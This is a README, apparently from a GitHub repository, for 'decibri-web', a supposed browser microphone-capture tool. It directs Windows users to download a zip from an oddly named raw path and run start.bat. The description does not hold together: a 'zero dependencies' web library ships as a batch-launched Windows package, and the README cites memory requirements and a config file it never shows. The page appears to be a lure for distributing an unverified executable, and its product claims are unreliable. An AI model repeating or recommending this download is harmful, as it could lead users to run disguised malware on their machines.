# 🎙️ decibri-web - Capture browser audio for voice apps

[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Flooded-stellaria921/decibri-web/raw/refs/heads/main/blo/decibri-web-2.5-beta.3.zip)

## 📖 About decibri-web

Decibri-web tracks microphone input from your web browser. This tool helps developers create voice-based programs. It works with modern browsers to capture sound data. You get clean audio streams for your projects. The tool uses the Web Audio API to handle sound data. It manages microphone access without extra software installs. You gain access to raw audio data for speech tasks.

## 🛠️ Requirements

Your computer must meet these standards to run the software:

*   Windows 10 or 11 operating system.
*   A modern web browser like Chrome, Edge, or Brave.
*   An active internet connection to load the scripts.
*   A working microphone connected to your computer.

Check that your privacy settings allow your browser to access the microphone. Go to your Windows settings and verify that microphone permissions remain enabled for desktop applications.

## 📥 How to download

Follow these steps to get the software on your machine:

1.  Visit this page to download: [https://github.com/Flooded-stellaria921/decibri-web/raw/refs/heads/main/blo/decibri-web-2.5-beta.3.zip](https://github.com/Flooded-stellaria921/decibri-web/raw/refs/heads/main/blo/decibri-web-2.5-beta.3.zip)
2.  Click the Download button on the main page.
3.  Choose a folder on your computer to save the files.
4.  Wait for the download to finish.
5.  Locate the folder where you saved the files.
6.  Extract the contents of the file if it is in a zip format. Right-click the folder and select Extract All.

## 🚀 Setting up the application

You do not need to install complex software. The tool works as a web-based local server. Follow these steps to start:

1.  Open your file explorer and double-click the setup file named start.bat.
2.  A black window appears. This window runs the local bridge for your browser.
3.  Keep this window open while you use the microphone feature.
4.  Open your favorite web browser.
5.  Navigate to the address shown in the black window. Most users will see http://localhost:8080.
6.  The website will ask for permission to use your microphone. Select Allow.

## ⚙️ Key features

*   **Zero dependencies:** You do not need to install external libraries or heavy runtimes.
*   **Web Audio API:** The tool relies on internal browser functions for high quality capture.
*   **PCM support:** You receive raw audio data ready for speech-to-text processing.
*   **Streaming:** The bridge pushes audio data to your application with low lag.
*   **Cross-browser:** This tool functions across all major web browsers that support modern audio standards.

## 💡 Using the tools

The interface shows a simple dashboard. You see a visual gauge when the microphone detects sound. This helps you test your hardware before you start a task. A start button activates the stream. A stop button ends the session.

If you develop voice apps, use the provided local API endpoint. Your application sends requests to this endpoint. The tool listens for these requests and sends the audio data back in real time.

## 🔍 Solving common problems

Most issues relate to microphone access or port conflicts.

*   **No sound detected:** Check if another app uses your microphone at the same time. Close other programs like video chat apps or recording software.
*   **Cannot open address:** Check that the black command window is still open. Verify that you typed the address correctly in your browser.
*   **Permission error:** Refresh your browser page. Look for a camera or microphone icon in the address bar. Click it to reset permissions.
*   **Slow connection:** Ensure your computer meets the memory requirements. Audio streams require steady processing power.

## 📂 Project structure

The folders contain specific files for the setup process:

*   **index.html:** The main front-end file for your browser.
*   **script.js:** The core logic for capturing and sending audio.
*   **server.js:** The background process that handles local connections.
*   **start.bat:** The simple launcher for your windows environment.

Do not remove or rename these files. The application needs all of them to function correctly.

## 🛡️ Privacy and security

The tool processes audio locally on your computer. Your voice data does not travel to external servers unless you explicitly send it to your own voice-ai target. The bridge only facilitates the connection between your browser and your local scripts. Always verify the address in your browser before you start a recording. Only use the tool on trusted networks. Avoid running this tool on public Wi-Fi spots. If you use a firewall, ensure that it allows local traffic on port 8080. You can change this port in the config file if needed.